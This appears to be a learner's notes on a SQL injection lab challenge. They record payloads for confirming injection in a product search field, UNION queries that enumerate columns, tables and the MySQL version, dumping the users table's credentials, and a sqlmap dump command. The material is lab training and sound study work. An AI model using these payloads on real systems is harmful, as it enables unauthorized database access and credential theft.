#sql 
### Identify If SQL injection Exists
* From main product page, sent normal requst in search bar, matching, Senapi Knife Set
* Sent this successful POST to repeater
* testing with SQL injection
```shell
# original Content-Length: 2516
product=Senpai+Knife+Set
# testing
product=Senpai+Knife+Set'
product=Senpai+Knife+Set'
# Success!!  Content-Length: 4946
# All products returned
product=Senpai+Knife+Set' or 1=1#

' # can also test with any value, then or 1=1#
x' or 1=1#
```
### Union to Identify columns
```shell
# I kept adding more null entries here until I got something back
product=Senpai+Knife+Set' union select null,null,null,null#
' # this makes sense because there is a title, image,price,description
product=Senpai+Knife+Set' union select null,null,null,version()#
```
* Version is showing as mysql 8.0.40
* Now that we identified the queries columns, lets get more data
```shell
# Dump the DB tables
product=Senpai+Knife+Set' union select null,null,null,table_name from information_schema.tables#
```
Found the USERS  tables  
* injection0x03_users
```shell
# dump the columns
product=Senpai+Knife+Set' union select null,null,null,column_name from information_schema.columns#
```
* column name of 'NAME', 'USER', 'username', 'password','ENCRYPTION'
* I added the following to the end of the SQL query, and I think this gave me all the columns from the injection0x03_users table 
```shell
' union select null,null,null,column_name from information_schema.columns#; SHOW COLUMNS FROM injection0x03_users#
```
* Injection0x03 table

| username | password | email            |
| -------- | -------- | ---------------- |
| stuff    | no idea  | noidea@gmail.com |
* Now we have a table name, and columns in the table, we can retry our union selection, modified slightly to see if we can just read the table
```shell
product=Senpai Knife Set' UNION ALL SELECT username,password,NULL,NULL FROM injection0x03_users-- -
```
* Success, we get a username password of 
	* user=  takeshi  pass =  onigirigadaisuki 

## Easy from WALKTHROUGH
```
product=Senpai Knife Set' UNION SELECT NULL,NULL,NULL,username FROM injection0x03_users#

product=Senpai Knife Set' UNION SELECT NULL,NULL,NULL,password FROM injection0x03_users#
```

Trying again with 
`sqlmap -r req3.txt --level=2 --dump -T injection0x03_users`
* The req is modified, so the product= was removed, and dummy data was input there.. 
	* product=test
* since we know the table name already, we can provide that as input.

we get the table dumped as output

![[4 - SQL Injection Challenge-table dump.png]]



